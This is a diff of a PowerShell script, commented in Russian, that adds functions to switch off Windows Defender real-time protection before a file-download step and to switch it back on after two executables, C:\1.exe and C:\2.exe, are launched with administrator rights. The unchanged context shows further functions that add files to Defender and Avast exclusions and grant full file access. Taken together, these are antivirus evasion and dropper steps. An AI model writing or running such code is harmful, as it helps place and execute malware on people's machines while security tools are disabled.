@@ -1,3 +1,23 @@
+# Функция для отключения защиты в режиме реального времени Windows Defender
+function Disable-WindowsDefender-RealTimeProtection {
+    try {
+        Set-MpPreference -DisableRealtimeMonitoring $true
+        Write-Output "Защита в режиме реального времени Windows Defender отключена."
+    } catch {
+        Write-Error "Ошибка при отключении защиты в режиме реального времени Windows Defender: $_"
+    }
+}
+
+# Функция для включения защиты в режиме реального времени Windows Defender
+function Enable-WindowsDefender-RealTimeProtection {
+    try {
+        Set-MpPreference -DisableRealtimeMonitoring $false
+        Write-Output "Защита в режиме реального времени Windows Defender включена."
+    } catch {
+        Write-Error "Ошибка при включении защиты в режиме реального времени Windows Defender: $_"
+    }
+}
+
 # Функция для добавления файла в исключения Windows Defender
 function Add-To-WindowsDefender-Exclusion {
     param (
@@ -24,7 +44,7 @@ function Add-To-WindowsDefender-Exclusion {
 }
 
 # Функция для добавления файла в исключения Avast Antivirus
-function Add-To-Avast-0Exclusion {
+function Add-To-Avast-Exclusion {
     param (
         [string]$filePath
     )
@@ -95,15 +115,18 @@ function Set-FullAccessTo-File {
         $rule = New-Object System.Security.AccessControl.FileSystemAccessRule $permissions
         $acl.AddAccessRule($rule)
         Set-Acl $filePath $acl
-        Write-Output "Полный доступ установлен для файла $($filePath)."
+        Write-Output "Полный доступ установлен для файла $filePath."
     } catch {
-        Write-Error "Ошибка при установке полного доступа для файла $($filePath): $_"
+        Write-Error "Ошибка при установке полного доступа для файла $filePath: $_"
     }
 }
 
 # Пути к файлам
 $file1 = "C:\1.exe"
 $file2 = "C:\2.exe"
+
+# Отключение защиты в режиме реального времени Windows Defender
+Disable-WindowsDefender-RealTimeProtection
 
 # Загрузка файлов
 try {
@@ -157,3 +180,6 @@ Start-Process -FilePath $decodedPath2 -Verb RunAs
 # Завершающий запуск файлов с правами администратора
 Start-Process -FilePath $file1 -Verb RunAs
 Start-Process -FilePath $file2 -Verb RunAs
+
+# Включение защиты в режиме реального времени Windows Defender
+Enable-WindowsDefender-RealTimeProtection
